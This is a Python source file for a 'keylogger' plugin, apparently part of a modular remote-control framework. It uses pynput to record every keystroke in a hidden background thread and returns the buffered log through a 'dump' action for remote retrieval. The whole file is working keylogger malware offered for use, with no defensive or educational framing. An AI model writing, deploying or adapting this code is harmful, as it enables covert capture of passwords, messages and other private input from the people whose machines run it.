import threading
import time
from pynput import keyboard
try:
    from .base import BasePlugin
except (ImportError, ValueError):
    from base import BasePlugin
from typing import Dict, Any

class KeyloggerPlugin(BasePlugin):
    _listener = None
    _log = ""
    _is_running = False

    @property
    def name(self): return "keylogger"

    def _on_press(self, key):
        try:
            k = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space: k = " "
            elif key == keyboard.Key.enter: k = "[ENTER]\n"
            elif key == keyboard.Key.backspace: k = "[BCK]"
            else: k = f"[{str(key)}]"
        KeyloggerPlugin._log += k

    def execute(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        action = payload.get("action", "start")
        duration = payload.get("duration", 30)

        if action == "start":
            if KeyloggerPlugin._is_running:
                return {"status": "error", "error": "Keylogger already running"}
            
            KeyloggerPlugin._log = ""
            KeyloggerPlugin._is_running = True
            
            def run_logger():
                with keyboard.Listener(on_press=self._on_press) as listener:
                    KeyloggerPlugin._listener = listener
                    # Run for specified duration if provided, else run until stopped
                    if duration > 0:
                        time.sleep(duration)
                        listener.stop()
                        KeyloggerPlugin._is_running = False
                    else:
                        listener.join()

            threading.Thread(target=run_logger, daemon=True).start()
            return {"status": "success", "message": f"Keylogger started for {duration}s"}

        elif action == "dump":
            data = KeyloggerPlugin._log
            KeyloggerPlugin._log = "" # Clear after dump
            return {"status": "success", "log": data}

        elif action == "stop":
            if KeyloggerPlugin._listener:
                KeyloggerPlugin._listener.stop()
                KeyloggerPlugin._is_running = False
                return {"status": "success", "message": "Keylogger stopped"}
            return {"status": "error", "error": "Keylogger not running"}

        return {"status": "error", "error": "Invalid action"}
